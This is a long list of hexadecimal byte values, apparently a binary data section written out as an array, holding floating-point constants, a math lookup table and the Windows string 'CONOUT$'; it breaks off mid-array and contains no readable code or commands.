0xf0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0xd5, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x8f, 0xc0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfd, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xee, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf1, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe6, 0x54, 0x55, 0x55, 0x55, 0x55, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0xc6, 0xba, 0x99, 0x99, 0x99, 0x89, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9f, 0x51, 0xf1, 0x7, 0x23, 0x49, 0x62, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0xff, 0x5d, 0xc8, 0x34, 0x80, 0x3c, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x43, 0x0, 0x4f, 0x0, 0x4e, 0x0, 0x4f, 0x0, 0x55, 0x0, 0x54, 0x0, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x9e, 0xbd, 0x5b, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xd4, 0xaf, 0x6b, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x95, 0xb9, 0x74, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x76, 0x94, 0x7b, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x4d, 0x34, 0x81, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x8, 0x9b, 0x84, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x71, 0xfe, 0x87, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x90, 0x5e, 0x8b, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x6a, 0xbb, 0x8e, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x83, 0xa, 0x91, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xb5, 0xb5, 0x92, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x4f, 0x5f, 0x94, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x53, 0x7, 0x96, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xc3, 0xad, 0x97, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xa4, 0x52, 0x99, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xf9, 0xf5, 0x9a, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xc3, 0x97, 0x9c, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x6, 0x38, 0x9e, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xc5, 0xd6, 0x9f, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x1, 0xba, 0xa0, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xe1, 0x87, 0xa1, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x2, 0x55, 0xa2, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x67, 0x21, 0xa3, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x11, 0xed, 0xa3, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x1, 0xb8, 0xa4, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x38, 0x82, 0xa5, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xb9, 0x4b, 0xa6, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x83, 0x14, 0xa7, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x98, 0xdc, 0xa7, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xfa, 0xa3, 0xa8, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xaa, 0x6a, 0xa9, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xa9, 0x30, 0xaa, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xf9, 0xf5, 0xaa, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x9a, 0xba, 0xab, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x8d, 0x7e, 0xac, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xd5, 0x41, 0xad, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x71, 0x4, 0xae, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x64, 0xc6, 0xae, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xae, 0x87, 0xaf, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x28, 0x24, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x26, 0x84, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0x90, 0xd2, 0xe3, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x2c, 0x43, 0xb1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x34, 0xa2, 0xb1, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xeb, 0x0, 0xb2, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x52, 0x5f, 0xb2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x68, 0xbd, 0xb2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x30, 0x1b, 0xb3, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xa8, 0x78, 0xb3, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xd3, 0xd5, 0xb3, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xaf, 0x32, 0xb4, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x3e, 0x8f, 0xb4, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x81, 0xeb, 0xb4, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x77, 0x47, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x21, 0xa3, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x80, 0xfe, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x94, 0x59, 0xb6, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x5d, 0xb4, 0xb6, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xdd, 0xe, 0xb7, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x14, 0x69, 0xb7, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x1, 0xc3, 0xb7, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xa6, 0x1c, 0xb8, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x3, 0x76, 0xb8, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x18, 0xcf, 0xb8, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xe6, 0x27, 0xb9, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x6d, 0x80, 0xb9, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xae, 0xd8, 0xb9, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xa9, 0x30, 0xba, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x5f, 0x88, 0xba, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xd0, 0xdf, 0xba, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xfc, 0x36, 0xbb, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xe4, 0x8d, 0xbb, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x89, 0xe4, 0xbb, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xea, 0x3a, 0xbc, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x8, 0x91, 0xbc, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xe4, 0xe6, 0xbc, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x7d, 0x3c, 0xbd, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xd5, 0x91, 0xbd, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xec, 0xe6, 0xbd, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xc1, 0x3b, 0xbe, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x56, 0x90, 0xbe, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xab, 0xe4, 0xbe, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xc0, 0x38, 0xbf, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x96, 0x8c, 0xbf, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x2d, 0xe0, 0xbf, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xc2, 0x19, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x4f, 0x43, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xbd, 0x6c, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xc, 0x96, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x3d, 0xbf, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x4f, 0xe8, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x42, 0x11, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x18, 0x3a, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xd0, 0x62, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x6a, 0x8b, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xe7, 0xb3, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x46, 0xdc, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x88, 0x4, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xac, 0x2c, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xb4, 0x54, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x9f, 0x7c, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x6e, 0xa4, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x20, 0xcc, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0x90, 0xb6, 0xf3, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x30, 0x1b, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x8e, 0x42, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xd0, 0x69, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xf6, 0x90, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x1, 0xb8, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xf0, 0xde, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xc5, 0x5, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x7e, 0x2c, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x1c, 0x53, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xa0, 0x79, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x9, 0xa0, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x58, 0xc6, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x8c, 0xec, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xa6, 0x12, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xa6, 0x38, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x8c, 0x5e, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x58, 0x84, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xb, 0xaa, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xa4, 0xcf, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x24, 0xf5, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x8a, 0x1a, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xd8, 0x3f, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xc, 0x65, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x28, 0x8a, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x2b, 0xaf, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x15, 0xd4, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xe7, 0xf8, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xa1, 0x1d, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x42, 0x42, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xcc, 0x66, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x3d, 0x8b, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x97, 0xaf, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xd9, 0xd3, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x3, 0xf8, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x16, 0x1c, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x11, 0x40, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xf5, 0x63, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xc2, 0x87, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x79, 0xab, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x18, 0xcf, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xa0, 0xf2, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x12, 0x16, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x6d, 0x39, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xb2, 0x5c, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xe1, 0x7f, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xf9, 0xa2, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xfb, 0xc5, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xe7, 0xe8, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xbd, 0xb, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x7e, 0x2e, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x29, 0x51, 0xca, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xbe, 0x73, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x3e, 0x96, 0xca, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xa8, 0xb8, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xfe, 0xda, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x3e, 0xfd, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x69, 0x1f, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x7f, 0x41, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x80, 0x63, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x6c, 0x85, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x44, 0xa7, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x7, 0xc9, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xb6, 0xea, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x51, 0xc, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xd7, 0x2d, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x49, 0x4f, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xa7, 0x70, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xf1, 0x91, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x27, 0xb3, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x49, 0xd4, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x58, 0xf5, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x53, 0x16, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x3a, 0x37, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xe, 0x58, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xcf, 0x78, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x7c, 0x99, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x16, 0xba, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x9d, 0xda, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x11, 0xfb, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x73, 0x1b, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xc1, 0x3b, 0xce, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xfd, 0x5b, 0xce, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x26, 0x7c, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x3c, 0x9c, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x40, 0xbc, 0xce, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x32, 0xdc, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x11, 0xfc, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xde, 0x1b, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x99, 0x3b, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x42, 0x5b, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xd9, 0x7a, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x5e, 0x9a, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x90, 0xd1, 0xb9, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x32, 0xd9, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x82, 0xf8, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xe0, 0xb, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x76, 0x1b, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x4, 0x2b, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x89, 0x3a, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x5, 0x4a, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x78, 0x59, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xe3, 0x68, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x46, 0x78, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xa0, 0x87, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xf2, 0x96, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x3b, 0xa6, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x7b, 0xb5, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xb4, 0xc4, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xe4, 0xd3, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xc, 0xe3, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x2b, 0xf2, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x43, 0x1, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x52, 0x10, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x59, 0x1f, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x58, 0x2e, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x4f, 0x3d, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x3d, 0x4c, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x24, 0x5b, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x3, 0x6a, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xda, 0x78, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xa9, 0x87, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x70, 0x96, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x2f, 0xa5, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xe7, 0xb3, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x96, 0xc2, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x3e, 0xd1, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xde, 0xdf, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x77, 0xee, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x8, 0xfd, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x91, 0xb, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x13, 0x1a, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x8d, 0x28, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x0, 0x37, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x6b, 0x45, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xce, 0x53, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x2b, 0x62, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x7f, 0x70, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xcd, 0x7e, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x13, 0x8d, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x52, 0x9b, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x89, 0xa9, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xb9, 0xb7, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xe2, 0xc5, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x4, 0xd4, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x1f, 0xe2, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x32, 0xf0, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x3f, 0xfe, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x44, 0xc, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x42, 0x1a, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x39, 0x28, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x2a, 0x36, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x13, 0x44, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8f, 0x20, 0xb2, 0x22, 0xbc, 0xa, 0xb2, 0x3d, 0xd4, 0xd, 0x2e, 0x33, 0x69, 0xf, 0xb1, 0x3d, 0x57, 0xd2, 0x7e, 0xe8, 0xd, 0x95, 0xce, 0x3d, 0x69, 0x6d, 0x62, 0x3b, 0x44, 0xf3, 0xd3, 0x3d, 0x57, 0x3e, 0x36, 0xa5, 0xea, 0x5a, 0xf4, 0x3d, 0xb, 0xbf, 0xe1, 0x3c, 0x68, 0x43, 0xc4, 0x3d, 0x11, 0xa5, 0xc6, 0x60, 0xcd, 0x89, 0xf9, 0x3d, 0x9f, 0x2e, 0x1f, 0x20, 0x6f, 0x62, 0xfd, 0x3d, 0xcd, 0xbd, 0xda, 0xb8, 0x8b, 0x4f, 0xe9, 0x3d, 0x15, 0x30, 0x42, 0xef, 0xd8, 0x88, 0x0, 0x3e, 0xad, 0x79, 0x2b, 0xa6, 0x13, 0x4, 0x8, 0x3e, 0xc4, 0xd3, 0xee, 0xc0, 0x17, 0x97, 0x5, 0x3e, 0x2, 0x49, 0xd4, 0xad, 0x77, 0x4a, 0xad, 0x3d, 0xe, 0x30, 0x37, 0xf0, 0x3f, 0x76, 0xe, 0x3e, 0xc3, 0xf6, 0x6, 0x47, 0xd7, 0x62, 0xe1, 0x3d, 0x14, 0xbc, 0x4d, 0x1f, 0xcc, 0x1, 0x6, 0x3e, 0xbf, 0xe5, 0xf6, 0x51, 0xe0, 0xf3, 0xea, 0x3d, 0xeb, 0xf3, 0x1a, 0x1e, 0xb, 0x7a, 0x9, 0x3e, 0xc7, 0x2, 0xc0, 0x70, 0x89, 0xa3, 0xc0, 0x3d, 0x51, 0xc7, 0x57, 0x0, 0x0, 0x2e, 0x10, 0x3e, 0xe, 0x6e, 0xcd, 0xee, 0x0, 0x5b, 0x15, 0x3e, 0xaf, 0xb5, 0x3, 0x70, 0x29, 0x86, 0xdf, 0x3d, 0x6d, 0xa3, 0x36, 0xb3, 0xb9, 0x57, 0x10, 0x3e, 0x4f, 0xea, 0x6, 0x4a, 0xc8, 0x4b, 0x13, 0x3e, 0xad, 0xbc, 0xa1, 0x9e, 0xda, 0x43, 0x16, 0x3e, 0x2a, 0xea, 0xf7, 0xb4, 0xa7, 0x66, 0x1d, 0x3e, 0xef, 0xfc, 0xf7, 0x38, 0xe0, 0xb2, 0xf6, 0x3d, 0x88, 0xf0, 0x70, 0xc6, 0x54, 0xe9, 0xf3, 0x3d, 0xb3, 0xca, 0x3a, 0x9, 0x9, 0x72, 0x4, 0x3e, 0xa7, 0x5d, 0x27, 0xe7, 0x8f, 0x70, 0x1d, 0x3e, 0xe7, 0xb9, 0x71, 0x77, 0x9e, 0xdf, 0x1f, 0x3e, 0x60, 0x6, 0xa, 0xa7, 0xbf, 0x27, 0x8, 0x3e, 0x14, 0xbc, 0x4d, 0x1f, 0xcc, 0x1, 0x16, 0x3e, 0x5b, 0x5e, 0x6a, 0x10, 0xf6, 0x37, 0x6, 0x3e, 0x4b, 0x62, 0x7c, 0xf1, 0x13, 0x6a, 0x12, 0x3e, 0x3a, 0x62, 0x80, 0xce, 0xb2, 0x3e, 0x9, 0x3e, 0xde, 0x94, 0x15, 0xe9, 0xd1, 0x30, 0x14, 0x3e, 0x31, 0xa0, 0x8f, 0x10, 0x10, 0x6b, 0x1d, 0x3e, 0x41, 0xf2, 0xba, 0xb, 0x9c, 0x87, 0x16, 0x3e, 0x2b, 0xbc, 0xa6, 0x5e, 0x1, 0x8, 0xff, 0x3d, 0x6c, 0x67, 0xc6, 0xcd, 0x3d, 0xb6, 0x29, 0x3e, 0x2c, 0xab, 0xc4, 0xbc, 0x2c, 0x2, 0x2b, 0x3e, 0x44, 0x65, 0xdd, 0x7d, 0xd0, 0x17, 0xf9, 0x3d, 0x9e, 0x37, 